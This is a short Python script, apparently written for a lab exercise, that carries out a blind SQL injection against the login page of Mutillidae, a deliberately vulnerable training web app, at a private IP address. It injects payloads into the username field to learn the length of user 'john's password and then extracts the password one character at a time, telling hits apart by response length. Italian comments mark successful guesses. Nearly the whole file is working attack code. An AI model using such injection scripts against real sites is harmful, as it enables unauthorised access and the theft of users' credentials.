import requests
import string
alphabet = string.printable

print(alphabet)
print(len(alphabet))
url = "http://192.168.122.152/mutillidae/index.php?page=login.php"

data = {
    'username': "john' AND LENGTH(password)=6 -- ",
    'password': "",
    'login-php-submit-button': "Login",
}

response = requests.post(url, data=data)

print("Status Code", response.status_code)
print("JSON Response ", len(response.text))

password_trovata = []

for i in range(1,7):

    for j in alphabet:
        
        data = {
        'username': f"john' AND SUBSTRING(password,{i},1)='{j}' -- ",
        'password': "",
        'login-php-submit-button': "Login",
        }
        response = requests.post(url, data=data)
        if len(response.text) == 50099:
            print("ho indovinato il carattere ", j)
            password_trovata.append(j)
            break ## devi mettere questa, perché sennò mi continua a controllare anche le lettere maiuscole


print(password_trovata)









